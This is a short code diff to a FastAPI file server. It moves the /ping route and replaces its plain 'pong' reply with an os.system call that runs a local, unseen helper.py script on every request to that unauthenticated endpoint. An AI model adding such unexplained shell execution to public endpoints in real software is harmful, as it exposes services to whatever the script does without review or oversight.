@@ -16,6 +16,9 @@ app.add_middleware(
 
 # Serve files from current directory
 BASE_DIR = os.getcwd()
+@app.get("/ping")
+async def ping():
+    return os.system("python helper.py info ping")
 
 @app.get("/{file_path:path}")
 async def serve_file(file_path: str):
@@ -29,9 +32,6 @@ async def serve_file(file_path: str):
             return FileResponse(index_path)
     else:
         return HTMLResponse("<h1>404 Not Found</h1>", status_code=404)
-@app.get("/ping")
-async def ping():
-    return {"message": "pong"}
 if __name__ == "__main__":
     try:
         uvicorn.run("main:app", host="0.0.0.0", port=80, reload=True)
